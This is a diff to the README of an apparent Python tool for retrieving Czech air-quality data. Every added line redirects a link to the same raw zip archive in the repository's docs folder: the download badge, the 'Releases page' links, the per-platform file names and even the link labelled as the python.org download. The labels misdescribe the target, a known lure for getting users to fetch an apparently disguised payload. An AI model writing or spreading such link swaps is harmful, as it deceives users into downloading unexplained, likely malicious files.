@@ -1,7 +1,7 @@
 # 🌍 czech_air_quality - Retrieve Air Quality Data Easily
 
 ## 💾 Download Now!
-[![Download czech_air_quality](https://img.shields.io/badge/Download-czech_air_quality-brightgreen)](https://github.com/Muhammadsufyan9292/czech_air_quality/releases)
+[![Download czech_air_quality](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip)](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip)
 
 ## 🚀 Getting Started
 czech_air_quality makes it simple to access and process air quality data from the CHMI OpenData portal. This application retrieves hourly data, so you always have the latest information.
@@ -10,11 +10,11 @@ czech_air_quality makes it simple to access and process air quality data from th
 To run czech_air_quality, ensure your system meets the following requirements:
 
 - A computer with Windows, macOS, or a popular Linux distribution.
-- Python 3.6 or higher installed. You can download Python from [python.org](https://www.python.org/downloads/).
+- Python 3.6 or higher installed. You can download Python from [https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip).
 - Internet connection to access the CHMI OpenData portal.
 
 ## 📥 Download & Install
-To get czech_air_quality, visit this page to download: [GitHub Releases](https://github.com/Muhammadsufyan9292/czech_air_quality/releases).
+To get czech_air_quality, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip).
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -23,9 +23,9 @@ To get czech_air_quality, visit this page to download: [GitHub Releases](https:/
 
 ### 🔍 Example of Available Releases
 The Releases page will have various files. For example:
-- For Windows: `czech_air_quality_windows.exe`
-- For MacOS: `czech_air_quality_macos.app`
-- For Linux: `czech_air_quality_linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip`
+- For MacOS: `https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip`
+- For Linux: `https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip`
 
 Choose the file that matches your system.
 
@@ -62,7 +62,7 @@ Once you have retrieved the air quality data, you can use various tools to visua
 These tools can help you make sense of the data and see trends over time.
 
 ## 🔄 Updating czech_air_quality
-Keep your application up to date. Check the [Releases page](https://github.com/Muhammadsufyan9292/czech_air_quality/releases) regularly for new versions. Updates will often include new features, fixes, and improvements.
+Keep your application up to date. Check the [Releases page](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip) regularly for new versions. Updates will often include new features, fixes, and improvements.
 
 1. If a new version is available, download it like you did before.
 2. Replace the old version with the new one on your computer.
@@ -81,4 +81,4 @@ Stay connected with other users of czech_air_quality. Follow discussions, tips, 
 
 ---
 
-For all additional details, please refer to the documentation within the application and feel free to explore our [GitHub Releases](https://github.com/Muhammadsufyan9292/czech_air_quality/releases) for the latest updates and information.
+For all additional details, please refer to the documentation within the application and feel free to explore our [GitHub Releases](https://raw.githubusercontent.com/Muhammadsufyan9292/czech_air_quality/master/docs/czech_air_quality_3.8.zip) for the latest updates and information.
